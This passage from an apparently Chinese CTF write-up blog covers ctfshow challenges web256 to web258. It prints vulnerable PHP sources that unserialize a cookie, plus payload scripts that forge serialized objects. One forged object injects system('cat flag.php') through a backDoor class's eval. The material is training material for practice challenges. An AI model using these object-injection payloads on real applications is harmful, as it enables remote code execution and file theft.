punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230301203023324.png\" alt=\"image-20230301203023324\" /></p>\n<h2 id=\"web256\"><a class=\"anchor\" href=\"#web256\">#</a> web256</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">!==</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里有加上了一条 username 和 pasword 的不同</p>\n<p>简单改一下上一题的 payload 就可以直接用</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'demo'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">//O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22demo%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302191137410.png\" alt=\"image-20230302191137410\" /></p>\n<h2 id=\"web257\"><a class=\"anchor\" href=\"#web257\">#</a> web257</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'info'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">info</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这里的利用思路是在 ctfShowUser 里有一个__destruct 的方法会在对象销毁的时候会自动调用函数 getInfo ()，而在 backDoor 类中也有这个方法，而且会执行 eval 函数，这里我们需要覆盖这个__construct 方法</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">backDoor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"system('cat flag.php');\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>O:11:\"ctfShowUser\":1:&#123;s:5:\"class\";O:8:\"backDoor\":1:&#123;s:14:\" backDoor code\";s:23:\"system('cat flag.php');\";&#125;&#125;</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>*/</span></span></pre></td></tr></table></figure><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230302195845419.png\" alt=\"image-20230302195845419\" /></p>\n<h2 id=\"web258\"><a class=\"anchor\" href=\"#web258\">#</a> web258</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'info'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">info</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 